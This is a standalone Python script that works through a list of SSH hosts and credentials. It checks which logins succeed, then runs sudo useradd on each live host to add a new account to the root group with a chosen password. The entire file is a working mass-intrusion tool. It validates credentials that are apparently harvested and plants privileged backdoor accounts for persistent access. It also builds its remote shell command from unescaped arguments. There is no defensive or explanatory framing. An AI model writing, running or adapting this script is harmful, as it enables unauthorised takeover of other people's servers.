import paramiko
import subprocess

def check_ssh(ip, port, user, password):
    try:
        subprocess.check_output(
            ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-p', port, f'{user}@{ip}', 'echo 2>&1'],
            timeout=5,
            stderr=subprocess.STDOUT,
        )
        return True
    except subprocess.CalledProcessError:
        return False
    except subprocess.TimeoutExpired:
        return False

def add_user_as_root(ip, port, user, password, new_user, new_user_password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=int(port), username=user, password=password, timeout=5)

        # Create the new user with root permissions
        create_user_command = f'sudo useradd -m -g root -G root {new_user} && echo "{new_user}:{new_user_password}" | sudo chpasswd'
        stdin, stdout, stderr = ssh.exec_command(create_user_command)
        exit_code = stdout.channel.recv_exit_status()

        if exit_code == 0:
            print(f"User {new_user} added with root permissions on {ip}")
        else:
            print(f"Failed to add user {new_user} on {ip}. Error: {stderr.read().decode('utf-8').strip()}")

    except Exception as e:
        print(f"Error adding user on {ip}: {e}")

def main(input_file, new_user, new_user_password):
    with open(input_file, 'r') as f:
        lines = f.readlines()

    for line in lines:
        fields = line.strip().split('|')
        if len(fields) == 4:
            ip, port, user, password = fields
            print(f'Checking {ip}|{port}|{user}')
            if check_ssh(ip, port, user, password):
                print(f'Success: {ip}|{port}|{user} is live')
                add_user_as_root(ip, port, user, password, new_user, new_user_password)
            else:
                print(f'Failure: {ip}|{port}|{user} is dead')

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 4:
        print("Usage: python script.py <ssh_list_file> <new_user> <new_user_password>")
        sys.exit(1)

    input_file = sys.argv[1]
    new_user = sys.argv[2]
    new_user_password = sys.argv[3]

    main(input_file, new_user, new_user_password)
